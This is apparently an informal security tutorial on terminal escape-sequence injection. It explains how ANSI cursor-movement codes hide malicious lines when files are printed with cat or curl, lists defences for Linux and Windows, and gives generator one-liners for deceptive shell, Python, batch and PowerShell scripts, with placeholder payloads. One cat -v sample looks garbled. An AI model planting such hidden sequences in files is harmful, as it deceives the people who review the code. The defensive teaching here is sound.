A terminal escape sequence is a special sequence of characters that is printed (like any other text). But, if the terminal understands the sequence, it won’t display the character-sequence, but will perform some action.


Welcome to the world of terminal escape injections, or as some folks have called it in the past – The new XSS for Linux sysadmins.

it is happen in all os..


There are many different terminal emulators out there and each of them can have specific escape sequences on top the common ANSI/VT ones.

what’s the potential impact?

	    Install backdoor (RAT) on our system
	    Plant malware or rootkit on our system
	    Capture keystrokes and record our screen
	    Practically anything you can imagine really

how safe is it to cat an arbitrary file?

	The problem with these things is that they do not sanitize the output in any way. They merely print out whatever content is there. They don’t care.

	So if there is some binary content, they will just print it out and we will see some gibberish.

	And if there happens to be some particular byte sequence that the ANSI/VT terminal understands as an escape sequence, then the terminal will simply interpret it.

	So this is not really a bug. That’s just how things are with console applications. And as infosec professionals, we should be vigilant about the risks.


How escape injection works?
```
cat -v script.sh
#!/bin/sh

echo "evil!"
exit 0
^[[2Aecho "Hello World!"
```



	Now suppose we didn’t use the -v parameter. As the cat command is displaying the content of the script line by line, the escape sequence (^[[2A) will move the cursor 2 lines up – back on the position where the evil code is. And then the code will be rewritten by our benign (Hello World) code.
	
How to avoid escape sequence attacks in terminals?

UNIX/Linux

1. On UNIX based systems, beware of the utilities that output raw data. This includes:

    cat, head, tail, more
    curl, wget
    diff
    
2.  Use cat -v to display non-printable characters or use the less command.

For instance, we should never install software from the Internet just by using curl / wget and piping it into shell. Visual analysis is not enough:

```
curl -s http://example.com/install.sh
#!/bin/sh

echo "script..."

curl -s http://example.com/install.sh | sh
evil!

curl -s http://example.com/install.sh | cat -v
#!/bin/sh
echo "evil!"
#*[[2A^[[1echo "script..."

```

3. We can also use text editors such as nano, pico, vim, emacs or any other editor that we prefer.


Windows

1. In Command Prompt we can use the more command instead of the type command. The more command will reveal the escape sequences:

```
more script.bat
```
But it doesn’t work in PowerShell.

2. In PowerShell it seems there is no way to sanitize the escape sequences by using some parameter or some other function instead of using the get-content command.
I was only able to come up with the following somewhat clumsy and complicated solutions to reveal the hidden terminal injections:
```
Solution 1:
gc <file> -encoding Byte | % { [char]$_+" " | write-host -nonewline }
Solution 2:
gc <file> -encoding Byte | % { if ( $_ -lt 32 -or $_ -gt 126 ) { [char]$_+" " } else { [char]$_ } } | write-host -nonewline
```

3. Best solution on Windows is to always use text editors such as Notepad or WordPad. Do not rely on console utilities.

ex...

Shell script escape injection
```
echo -e '#!/bin/sh\n\necho "evil!"\nexit 0\n\033[2Aecho "Hello World!"\n' > script.sh
chmod a+x script.sh
```

Python script escape injection

```
echo -e '#!/usr/bin/python\n\nprint "evil!";\nexit(0);\n#\033[2A\033[1Dprint "Hello World!";\n' > script.py

chmod a+x script.py
```

Batch (Command Prompt) escape injection
```
echo -e '@echo off\n\r\n\recho evil!\r\n::\033[2D  \033[A\033[2Decho Hello World!' > script.bat
```

PS1 (PowerShell) escape injection
```
echo -e 'write-host "evil!"\r\n#\033[A\033[2Dwrite-host "Hello World!"' > script.ps1
```


